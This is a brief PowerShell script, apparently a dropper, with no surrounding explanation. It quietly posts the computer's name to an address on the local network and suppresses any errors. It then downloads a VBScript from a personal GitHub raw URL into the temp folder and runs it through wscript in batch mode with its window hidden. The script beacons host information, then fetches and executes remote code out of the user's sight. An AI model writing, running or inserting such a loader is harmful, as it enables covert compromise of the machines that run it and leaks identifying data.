try{Invoke-WebRequest -Uri 'http://192.168.1.12:8081/diag' -Method Post -Body ('fase=bootstrap&host='+$env:COMPUTERNAME) -TimeoutSec 3 -UseBasicParsing | Out-Null}catch{}
$ws="$env:TEMP\run.vbs";
iwr -UseBasicParsing https://raw.githubusercontent.com/joaosetti98/sa/refs/heads/main/run.vbs -Out $ws;
Start-Process -FilePath 'wscript.exe' -ArgumentList "//B //nologo `"$ws`"" -WindowStyle Hidden
